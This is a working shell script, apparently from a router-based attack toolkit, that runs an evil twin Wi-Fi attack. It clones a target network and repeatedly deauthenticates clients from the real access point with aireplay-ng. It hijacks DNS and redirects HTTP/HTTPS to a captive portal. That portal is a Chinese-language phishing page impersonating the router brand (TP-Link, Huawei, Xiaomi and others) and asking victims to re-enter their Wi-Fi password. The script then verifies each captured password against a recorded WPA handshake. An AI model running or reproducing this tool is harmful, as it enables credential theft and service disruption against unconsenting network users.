#!/bin/sh
# arx-et.sh — Evil Twin AP manager
# Usage: arx-et.sh start <ssid> <bssid> <channel> <iface> <ap_iface>
#        arx-et.sh start_env <bssid> <channel> <iface> <ap_iface>   (SSID from ARX_ET_SSID or start_ssid.txt)
#        arx-et.sh stop
#        arx-et.sh verify <ssid> <bssid> <password>

ET_DIR="/tmp/arx-et"
HOSTAPD_CONF="$ET_DIR/hostapd.conf"
DNSMASQ_CONF="$ET_DIR/dnsmasq.conf"
DNSMASQ_PID="$ET_DIR/dnsmasq.pid"
HTTPD_PID="$ET_DIR/httpd.pid"
DEAUTH_PID="$ET_DIR/deauth.pid"
RUNTIME_WATCH_PID="$ET_DIR/runtime_watch.pid"
CREDS_FILE="$ET_DIR/creds.txt"
PORTAL_DIR="$ET_DIR/www"
AP_IFACE_FILE="$ET_DIR/ap_iface.txt"
MON_IFACE_FILE="$ET_DIR/mon_iface.txt"
STATUS_FILE="$ET_DIR/status.txt"
PMKID_FILE="$ET_DIR/handshake.22000"
GW_IP="192.168.99.1"

cmd="$1"

_log() { echo "[arx-et] $*" >> "$ET_DIR/et.log" 2>/dev/null; }

_kill_pid_file() {
	local f="$1"
	[ -f "$f" ] || return
	local pid; pid=$(cat "$f" 2>/dev/null)
	[ -n "$pid" ] && [ "$pid" -eq "$pid" ] 2>/dev/null && {
		kill "$pid" 2>/dev/null
		sleep 1
		kill -9 "$pid" 2>/dev/null
	}
	rm -f "$f"
}

# 2.4 GHz: 1–14 → hw_mode g；5 GHz 常见 ≥32 → a；其余非法值回退信道 6 + g（避免误用 5 GHz）
_normalize_wifi_channel() {
	local ch="$1"
	[ -z "$ch" ] && ch=6
	case "$ch" in *[!0-9]*)
		_log "invalid channel (non-numeric): $1, using 6"
		echo 6
		return
		;;
	esac
	[ "$ch" -eq 0 ] && ch=6
	if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
		echo "$ch"
		return
	fi
	if [ "$ch" -ge 32 ]; then
		echo "$ch"
		return
	fi
	_log "invalid channel $ch (use 1-14 for 2.4GHz or >=32 for 5GHz), using 6"
	echo 6
}

_hw_mode_for_channel() {
	local ch="$1"
	case "$ch" in *[!0-9]*) echo g; return ;; esac
	if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
		echo g
	elif [ "$ch" -ge 32 ]; then
		echo a
	else
		echo g
	fi
}

# UTF-8 / 特殊字符 SSID → hostapd ssid2（连续十六进制，无分隔符）
_ssid_hex() {
	printf '%s' "$1" | od -An -tx1 2>/dev/null | tr -d ' \n'
}

_write_portal() {
	local ssid="$1"
	mkdir -p "$PORTAL_DIR"

	local bssid="$2"
	local oui; oui=$(echo "$bssid" | tr '[:lower:]' '[:upper:]' | cut -c1-8)
	local brand="路由器"
	case "$oui" in
		DC:FE:18|50:FA:84|C8:3A:35|14:CF:92|A0:AB:1B) brand="TP-Link" ;;
		54:89:98|AC:CF:23|C8:D3:A3|00:46:4B) brand="华为" ;;
		F8:E4:FB|50:EC:50|78:11:DC|34:CE:00) brand="小米" ;;
		28:6C:07|CC:08:FB|00:90:4C|74:DA:38) brand="ASUS" ;;
		C8:69:CD|00:1A:2B|B0:BE:76) brand="中兴" ;;
	esac

	local ssid_html; ssid_html=$(echo "$ssid" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g;s/"/\&quot;/g')

	cat > "$PORTAL_DIR/index.html" << HTMLEOF
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${brand} — 网络认证</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);padding:36px 32px;width:100%;max-width:400px}
.logo{text-align:center;margin-bottom:28px}
.logo-icon{width:64px;height:64px;background:linear-gradient(135deg,#1677ff,#0958d9);border-radius:16px;display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px}
.logo-icon svg{width:36px;height:36px;fill:#fff}
.logo h1{font-size:20px;font-weight:600;color:#1a1a1a}
.logo p{font-size:13px;color:#888;margin-top:4px}
.alert{background:#fff7e6;border:1px solid #ffd591;border-radius:8px;padding:12px 14px;font-size:13px;color:#874d00;margin-bottom:20px;display:flex;gap:10px;align-items:flex-start;line-height:1.5}
.alert-icon{flex-shrink:0;font-size:16px}
label{display:block;font-size:13px;font-weight:500;color:#333;margin-bottom:6px}
.ssid-badge{display:inline-flex;align-items:center;gap:6px;background:#f0f5ff;border:1px solid #adc6ff;border-radius:6px;padding:6px 12px;font-size:13px;color:#1677ff;font-weight:500;margin-bottom:16px}
.ssid-badge svg{width:14px;height:14px;fill:#1677ff}
.input-wrap{position:relative;margin-bottom:8px}
input[type=password],input[type=text]{width:100%;padding:10px 40px 10px 14px;border:1px solid #d9d9d9;border-radius:8px;font-size:14px;color:#1a1a1a;outline:none;transition:.2s}
input:focus{border-color:#1677ff;box-shadow:0 0 0 2px rgba(22,119,255,.15)}
.toggle-pw{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;color:#aaa;font-size:16px;user-select:none;line-height:1}
.hint{font-size:12px;color:#aaa;margin-bottom:20px}
.btn{width:100%;padding:11px;background:#1677ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;transition:.2s}
.btn:hover{background:#0958d9}
.btn:disabled{background:#bfbfbf;cursor:not-allowed}
.error{color:#ff4d4f;font-size:13px;margin-top:8px;display:none}
.success{text-align:center;display:none}
.success-icon{font-size:48px;margin-bottom:12px}
.success h2{font-size:18px;font-weight:600;color:#1a1a1a;margin-bottom:8px}
.success p{font-size:13px;color:#888;line-height:1.6}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="logo-icon">
      <svg viewBox="0 0 24 24"><path d="M1.5 8.5a13 13 0 0121 0M5 12a10 10 0 0114 0M8.5 15.5a6 6 0 017 0M12 19h.01" stroke="#fff" stroke-width="2" stroke-linecap="round" fill="none"/></svg>
    </div>
    <h1>${brand} 网络认证</h1>
    <p>需要验证身份才能继续使用网络</p>
  </div>
  <div class="alert">
    <span class="alert-icon">⚠️</span>
    <span>检测到您的设备长时间未验证，为保障网络安全，请重新输入 WiFi 密码以继续连接。</span>
  </div>
  <div id="form-area">
    <label>当前网络</label>
    <div class="ssid-badge">
      <svg viewBox="0 0 24 24"><path d="M5 12.55a11 11 0 0114.08 0M1.42 9a16 16 0 0121.16 0M8.53 16.11a6 6 0 016.95 0M12 20h.01" stroke="#1677ff" stroke-width="2" stroke-linecap="round" fill="none"/></svg>
      ${ssid_html}
    </div>
    <label for="pw">WiFi 密码</label>
    <div class="input-wrap">
      <input type="password" id="pw" placeholder="请输入 WiFi 密码" autocomplete="current-password" maxlength="63">
      <span class="toggle-pw" onclick="togglePw()" title="显示/隐藏">👁</span>
    </div>
    <p class="hint">密码长度 8-63 位</p>
    <button class="btn" id="submit-btn" onclick="submitPw()">验证并连接</button>
    <p class="error" id="err-msg"></p>
  </div>
  <div class="success" id="success-area">
    <div class="success-icon">✅</div>
    <h2>验证成功</h2>
    <p>密码正确，正在重新连接网络，请稍候...</p>
  </div>
</div>
<script>
function togglePw(){var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';}
function submitPw(){
  var pw=document.getElementById('pw').value.trim();
  var err=document.getElementById('err-msg');
  var btn=document.getElementById('submit-btn');
  err.style.display='none';
  if(pw.length<8){err.textContent='密码至少 8 位';err.style.display='block';return;}
  btn.disabled=true;btn.textContent='验证中...';
  fetch('/cgi-bin/submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'password='+encodeURIComponent(pw)})
    .then(function(r){return r.json();})
    .then(function(d){
      if(d.ok){
        document.getElementById('form-area').style.display='none';
        document.getElementById('success-area').style.display='block';
      } else {
        err.textContent=d.msg||'密码错误，请重试';
        err.style.display='block';
        btn.disabled=false;btn.textContent='验证并连接';
        document.getElementById('pw').value='';
        document.getElementById('pw').focus();
      }
    })
    .catch(function(){
      err.textContent='网络错误，请重试';err.style.display='block';
      btn.disabled=false;btn.textContent='验证并连接';
    });
}
document.getElementById('pw').addEventListener('keydown',function(e){if(e.key==='Enter')submitPw();});
</script>
</body>
</html>
HTMLEOF
	_log "portal written for ssid=$ssid brand=$brand"
}

# Captive-portal probe endpoints (DNS hijack sends many hosts to GW_IP:80).
_write_captive_probes() {
	mkdir -p "$PORTAL_DIR/library/test"
	# iOS/macOS — avoid body that iOS treats as "open internet" (plain "Success").
	cat > "$PORTAL_DIR/hotspot-detect.html" << 'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Sign-in</title></head><body>CaptivePortal</body></html>
EOF
	cp -f "$PORTAL_DIR/hotspot-detect.html" "$PORTAL_DIR/library/test/success.html"
	# Android / Chrome — prefer HTTP 204 (BusyBox httpd runs +x scripts in docroot as CGI on most builds).
	cat > "$PORTAL_DIR/generate_204" << 'EOF'
#!/bin/sh
printf 'Status: 204\r\n\r\n'
EOF
	chmod +x "$PORTAL_DIR/generate_204"
	# Windows NCSI-style probes (wrong body → captive UI).
	printf '%s\n' 'arx_captive_portal' > "$PORTAL_DIR/connecttest.txt"
	mkdir -p "$PORTAL_DIR/redirect"
	printf '%s\n' 'arx_captive_portal' > "$PORTAL_DIR/redirect/status.txt"
	printf '%s\n' 'arx_captive_portal' > "$PORTAL_DIR/ncsi.txt"
	# Firefox detectportal
	printf '%s\n' 'arx_captive_portal' > "$PORTAL_DIR/success.txt"
	_log "captive probe files written under $PORTAL_DIR"
}

_start_httpd() {
	mkdir -p "$PORTAL_DIR/cgi-bin"
	_write_captive_probes
	# Two URL shapes: /cgi-bin/submit.cgi and /cgi-bin/submit (BusyBox matches paths containing cgi-bin).
	for _s in "$PORTAL_DIR/cgi-bin/submit.cgi" "$PORTAL_DIR/cgi-bin/submit"; do
		cat > "$_s" << 'WRAPPER'
#!/bin/sh
exec /usr/bin/arx-et-submit.sh
WRAPPER
		chmod +x "$_s"
	done
	# Do not use "/cgi-bin:/abs/path" in httpd.conf — on BusyBox that collides with "path:user:pass" auth rules.
	# With -h PORTAL_DIR, /cgi-bin/* maps to $PORTAL_DIR/cgi-bin/* and executes as CGI.
	busybox httpd -p 80 -h "$PORTAL_DIR" &
	echo $! > "$HTTPD_PID"
	sleep 1
	hp=""
	[ -f "$HTTPD_PID" ] && hp=$(cat "$HTTPD_PID" 2>/dev/null)
	if [ -z "$hp" ] || ! kill -0 "$hp" 2>/dev/null; then
		rm -f "$HTTPD_PID"
		_log "httpd failed to bind or exited immediately (port 80 in use?)"
		return 1
	fi
	_log "httpd started pid=$hp docroot=$PORTAL_DIR (no -c; cgi-bin under docroot)"
	return 0
}

_start_dnsmasq() {
	local ap_iface="$1"

	ip addr flush dev "$ap_iface" 2>/dev/null
	ip addr add "$GW_IP/24" dev "$ap_iface"
	ip link set "$ap_iface" up

	cat > "$DNSMASQ_CONF" << DNSEOF
interface=$ap_iface
bind-interfaces
dhcp-range=192.168.99.10,192.168.99.100,255.255.255.0,10m
dhcp-option=3,$GW_IP
dhcp-option=6,$GW_IP
address=/#/$GW_IP
dhcp-option=114,http://$GW_IP/
no-resolv
no-hosts
pid-file=$DNSMASQ_PID
DNSEOF

	if ! dnsmasq -C "$DNSMASQ_CONF"; then
		_log "dnsmasq failed to start (see system log / config: $DNSMASQ_CONF)"
		return 1
	fi
	_log "dnsmasq started"

	iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "$GW_IP:80" 2>/dev/null
	iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 443 -j DNAT --to-destination "$GW_IP:80" 2>/dev/null
	iptables -A FORWARD -i "$ap_iface" -j DROP 2>/dev/null
	ip6tables -A FORWARD -i "$ap_iface" -j DROP 2>/dev/null
	_log "iptables/ip6tables captive rules on $ap_iface"
}

_start_hostapd() {
	local ssid="$1" channel="$2" ap_iface="$3"
	local hw_mode; hw_mode=$(_hw_mode_for_channel "$channel")

	_write_hostapd_conf() {
		local try_ax="$1"
		local ssid_hex
		ssid_hex=$(_ssid_hex "$ssid")
		[ -z "$ssid_hex" ] && ssid_hex=$(printf '%s' "arx-et" | od -An -tx1 | tr -d ' \n')
		{
			echo "interface=$ap_iface"
			echo "driver=nl80211"
			echo "ssid2=$ssid_hex"
			echo "hw_mode=$hw_mode"
			echo "channel=$channel"
			echo "ieee80211n=1"
			echo "wmm_enabled=1"
			if [ "$hw_mode" = "a" ]; then
				echo "ieee80211ac=1"
			fi
			if [ "$try_ax" = "1" ] && [ "$hw_mode" = "g" ]; then
				# Wi-Fi 6 / 2.4 GHz — many nl80211 drivers need HE enabled; falls back below if hostapd rejects config.
				echo "ieee80211ax=1"
			fi
			if [ "$try_ax" = "1" ] && [ "$hw_mode" = "a" ]; then
				echo "ieee80211ax=1"
			fi
			echo "auth_algs=1"
			echo "ignore_broadcast_ssid=0"
		} > "$HOSTAPD_CONF"
	}

	rm -f "$ET_DIR/hostapd.pid"
	_write_hostapd_conf 1
	hostapd -B "$HOSTAPD_CONF" -P "$ET_DIR/hostapd.pid" >> "$ET_DIR/et.log" 2>&1
	sleep 2
	hp=""
	[ -f "$ET_DIR/hostapd.pid" ] && hp=$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)
	if [ -n "$hp" ] && kill -0 "$hp" 2>/dev/null; then
		_log "hostapd running on $ap_iface ssid=$(echo "$ssid" | cut -c1-32) ch=$channel hw_mode=$hw_mode (ieee80211ax attempt)"
		return
	fi
	_log "hostapd failed with ax/he config, retrying minimal (hw_mode=$hw_mode)"
	rm -f "$ET_DIR/hostapd.pid"
	_write_hostapd_conf 0
	hostapd -B "$HOSTAPD_CONF" -P "$ET_DIR/hostapd.pid" >> "$ET_DIR/et.log" 2>&1
	sleep 2
	hp=""
	[ -f "$ET_DIR/hostapd.pid" ] && hp=$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)
	if [ -n "$hp" ] && kill -0 "$hp" 2>/dev/null; then
		_log "hostapd running on $ap_iface (minimal config)"
	else
		_log "hostapd still not running; see $ET_DIR/et.log"
	fi
}

_start_deauth() {
	local bssid="$1" mon_iface="$2"
	if ! command -v aireplay-ng >/dev/null 2>&1; then
		_log "aireplay-ng not installed, deauth loop skipped"
		rm -f "$DEAUTH_PID"
		return
	fi
	local burst=3
	local interval=5
	[ -f "$ET_DIR/deauth_burst.txt" ] && burst=$(cat "$ET_DIR/deauth_burst.txt")
	[ -f "$ET_DIR/deauth_interval.txt" ] && interval=$(cat "$ET_DIR/deauth_interval.txt")
	case "$burst" in *[!0-9]*) burst=3 ;; esac
	case "$interval" in *[!0-9]*) interval=5 ;; esac
	[ "$burst" -lt 1 ] && burst=1
	[ "$burst" -gt 20 ] && burst=20
	[ "$interval" -lt 2 ] && interval=2
	[ "$interval" -gt 120 ] && interval=120
	(while true; do
		aireplay-ng -0 "$burst" -a "$bssid" "$mon_iface" >> "$ET_DIR/et.log" 2>&1
		sleep "$interval"
	done) &
	echo $! > "$DEAUTH_PID"
	_log "deauth loop pid=$(cat $DEAUTH_PID) target=$bssid burst=$burst interval=${interval}s"
}

# Args: ssid bssid channel iface ap_iface
_do_evil_twin_start() {
	ssid="$1"
	bssid="$2"
	channel="$3"
	iface="$4"
	ap_iface="$5"
	[ -z "$ssid" ] || [ -z "$bssid" ] || [ -z "$iface" ] && { echo "missing args"; exit 1; }
	[ -z "$channel" ] && channel=6
	[ -z "$ap_iface" ] && ap_iface="${iface}ap"

	mkdir -p "$ET_DIR"
	channel=$(_normalize_wifi_channel "$channel")
	if [ -f "$ET_DIR/hostapd.pid" ]; then
		hp=$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)
		if [ -n "$hp" ] && ! kill -0 "$hp" 2>/dev/null; then
			logger -t arx-et "recovering stale evil twin state"
			sh /usr/bin/arx-et.sh stop
			sleep 1
		fi
	fi

	echo "" > "$ET_DIR/et.log"
	echo "$ap_iface" > "$AP_IFACE_FILE"
	echo "$ssid" > "$ET_DIR/target_ssid.txt"
	echo "$bssid" > "$ET_DIR/target_bssid.txt"
	echo "starting" > "$STATUS_FILE"
	echo "none" > "$ET_DIR/submit_state.txt"

	logger -t arx-et "Evil Twin start ssid=$ssid bssid=$bssid channel=$channel iface=$iface"

	phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print $2; exit}')
	airmon-ng start "$iface" >> "$ET_DIR/et.log" 2>&1
	mon_iface="${iface}mon"
	if ! iw dev "$mon_iface" info 2>/dev/null | grep -q "type monitor"; then
		actual_mon=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} $1=="type" && $2=="monitor"{print i; exit}')
		[ -n "$actual_mon" ] && mon_iface="$actual_mon"
	fi
	echo "$mon_iface" > "$MON_IFACE_FILE"
	_log "monitor iface: $mon_iface"

	if [ -n "$phy" ]; then
		iw phy "phy$phy" interface add "$ap_iface" type __ap >> "$ET_DIR/et.log" 2>&1 || \
			iw dev "$mon_iface" interface add "$ap_iface" type __ap >> "$ET_DIR/et.log" 2>&1
	else
		iw dev "$mon_iface" interface add "$ap_iface" type __ap >> "$ET_DIR/et.log" 2>&1 || \
			iw phy phy0 interface add "$ap_iface" type __ap >> "$ET_DIR/et.log" 2>&1
	fi
	_log "ap iface $ap_iface created"

	_write_portal "$ssid" "$bssid"
	_start_hostapd "$ssid" "$channel" "$ap_iface"
	if ! _start_dnsmasq "$ap_iface"; then
		_log "dnsmasq did not start; captive DNS/DHCP may be unavailable"
	fi
	if ! _start_httpd; then
		_log "httpd did not start; captive portal POST may be unavailable"
	fi
	_start_deauth "$bssid" "$mon_iface"

	echo "running" > "$STATUS_FILE"
	_log "evil twin fully started"

	mr=$(cat "$ET_DIR/max_runtime.txt" 2>/dev/null)
	case "$mr" in *[!0-9]*) mr=0 ;; esac
	if [ "$mr" -gt 0 ]; then
		(sleep "$mr"; logger -t arx-et "Evil Twin max runtime (${mr}s) reached, stopping"; sh /usr/bin/arx-et.sh stop) &
		echo $! > "$RUNTIME_WATCH_PID"
		_log "runtime watchdog pid=$(cat $RUNTIME_WATCH_PID) seconds=$mr"
	fi
}

case "$cmd" in
start)
	_do_evil_twin_start "$2" "$3" "$4" "$5" "$6"
	;;

start_env)
	mkdir -p "$ET_DIR"
	# SSID 由 LuCI 白名单过滤后写入 start_ssid.txt；下游一律使用 "$ssid" 引用
	ssid="${ARX_ET_SSID:-}"
	[ -z "$ssid" ] && [ -f "$ET_DIR/start_ssid.txt" ] && ssid=$(cat "$ET_DIR/start_ssid.txt" 2>/dev/null || true)
	[ -z "$ssid" ] && { logger -t arx-et "start_env: missing SSID (ARX_ET_SSID / start_ssid.txt)"; exit 1; }
	_do_evil_twin_start "$ssid" "$2" "$3" "$4" "$5"
	;;

stop)
	_log "stopping evil twin"
	logger -t arx-et "Evil Twin stop requested"
	echo "stopping" > "$STATUS_FILE"

	_kill_pid_file "$RUNTIME_WATCH_PID"
	_kill_pid_file "$DEAUTH_PID"
	_kill_pid_file "$HTTPD_PID"
	_kill_pid_file "$DNSMASQ_PID"
	_kill_pid_file "$ET_DIR/hostapd.pid"

	ap_iface=$(cat "$AP_IFACE_FILE" 2>/dev/null)
	if [ -n "$ap_iface" ]; then
		iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "$GW_IP:80" 2>/dev/null
		iptables -t nat -D PREROUTING -i "$ap_iface" -p tcp --dport 443 -j DNAT --to-destination "$GW_IP:80" 2>/dev/null
		iptables -D FORWARD -i "$ap_iface" -j DROP 2>/dev/null
		ip6tables -D FORWARD -i "$ap_iface" -j DROP 2>/dev/null
		ip addr flush dev "$ap_iface" 2>/dev/null
		iw dev "$ap_iface" del 2>/dev/null
	fi

	mon_iface=$(cat "$MON_IFACE_FILE" 2>/dev/null)
	[ -n "$mon_iface" ] && airmon-ng stop "$mon_iface" >> "$ET_DIR/et.log" 2>&1

	echo "stopped" > "$STATUS_FILE"
	echo "none" > "$ET_DIR/submit_state.txt"
	_log "evil twin stopped"
	;;

verify)
	ssid="$2"; bssid="$3"; password="$4"
	[ -z "$ssid" ] || [ -z "$password" ] && { echo '{"ok":false}'; exit 1; }
	if [ -f "$PMKID_FILE" ] && [ -s "$PMKID_FILE" ] && command -v hcxhashtool >/dev/null 2>&1; then
		hsin="$PMKID_FILE"
		tmpf="$ET_DIR/.verify22000"
		rm -f "$tmpf"
		bs_raw=$(cat "$ET_DIR/target_bssid.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' | tr -d ':')
		if [ -n "$bs_raw" ]; then
			grep -Fi "$bs_raw" "$PMKID_FILE" > "$tmpf" 2>/dev/null || true
			[ -s "$tmpf" ] && hsin="$tmpf"
		fi
		printf '%s' "$password" > "$ET_DIR/.psk_try"
		ok=0
		if hcxhashtool -i "$hsin" --psk="$(cat "$ET_DIR/.psk_try")" >/dev/null 2>&1; then
			ok=1
		fi
		rm -f "$ET_DIR/.psk_try" "$tmpf"
		if [ "$ok" -eq 1 ]; then
			echo '{"ok":true,"verified":true}'
		else
			echo '{"ok":true,"verified":false}'
		fi
	else
		echo '{"ok":true,"verified":false,"note":"no_handshake"}'
	fi
	;;
esac
